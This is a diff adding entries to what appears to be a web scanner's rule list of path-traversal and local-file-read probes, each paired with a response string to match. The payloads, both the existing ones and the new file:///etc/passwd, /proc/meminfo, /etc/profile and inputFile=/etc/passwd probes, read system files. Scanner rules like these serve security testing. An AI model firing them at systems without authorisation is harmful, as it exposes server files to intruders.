@@ -9,5 +9,11 @@
 /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    {tag="root:x:"}
 //././././././././././././././././././././././././../../../../../../../../etc/passwd              {tag="root:x:"}
 /etc/passwd    {tag="root:x:"}
+/file:///etc/passwd    {tag="root:x:"}
 /etc/hosts     {tag="127.0.0.1"}
 /aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/hosts   {status=200}  {tag="127.0.0.1"}
+
+/proc/meminfo     {tag="MemTotal"}  {status=200} 
+/etc/profile      {tag="/etc/profile.d/*.sh"}  {status=200} 
+
+/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd      {tag="root:x:"}
